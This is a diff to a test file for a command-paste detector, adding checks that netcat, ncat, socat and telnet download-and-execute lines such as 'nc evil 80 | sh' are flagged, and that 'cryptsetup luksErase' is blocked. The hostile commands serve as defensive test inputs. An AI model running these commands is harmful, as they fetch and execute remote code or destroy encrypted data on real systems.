@@ -488,6 +488,22 @@ jcheck "tok: exclusion substring scope kept (dmsetup)" 'd["score"] == 0' paste '
 jcheck "tok: exclusion substring scope kept (mongosh)" 'd["score"] == 0' paste 'mongosh --version'
 jcheck "tok: cryptsetup luksErase still blocks" 'd["action"] in ["BLOCK", "ISOLATE"]' paste 'cryptsetup luksErase x'
 
+# netcat-family fetch coverage (cycle-483): the classic `nc host port | sh`
+# and `nc > s; sh s` download-execute shapes were completely undetected —
+# 'nc' is a substring hazard (inside sync/zinc/func) so it gates via
+# ci_contains_tok with ncdu/ncftp/ncurses exclusions; ncat/netcat/socat/
+# telnet join the plain fetch tables.
+jcheck "ncfetch: nc pipe to shell fires P2" 'd["score"] == 40 and "HLSE-PASTE-P2" in d["reason_ids"]' paste 'nc evil 80 | sh'
+jcheck "ncfetch: ncat pipe to shell fires P2" 'd["score"] == 40' paste 'ncat evil 443 | sh'
+jcheck "ncfetch: netcat pipe to shell fires P2" 'd["score"] == 40' paste 'netcat evil 21 | sh'
+jcheck "ncfetch: nc redirect+exec fires P12b" 'd["score"] == 45 and "P12b" in str(d["reasons"])' paste 'nc evil 80 > /tmp/s; sh /tmp/s'
+jcheck "ncfetch: socat OPEN creat+exec fires" 'd["score"] >= 45' paste 'socat TCP4:e:80 OPEN:/tmp/s,creat; sh /tmp/s'
+jcheck "ncfetch: telnet redirect+exec fires" 'd["score"] >= 45' paste 'telnet evil 23 > s; sh s'
+jcheck "ncfetch: bare nc connect stays clean" 'd["score"] == 0' paste 'nc evil 80'
+jcheck "ncfetch: sync+exec stays clean" 'd["score"] == 0' paste 'sync && sh x'
+jcheck "ncfetch: zinc+exec stays clean" 'd["score"] == 0' paste 'zinc a; sh x'
+jcheck "ncfetch: ncdu own class not P12b" 'd["score"] == 45 and "P12b" not in str(d["reasons"])' paste 'ncdu /tmp; sh x'
+
 # P8 (also:) overflow guard: 5 hits with 105-141-char labels must not
 # smash extra[192] — cycle-439 fixed a would-be-length advance that
 # underflowed the snprintf size (ASan stack-buffer-overflow).
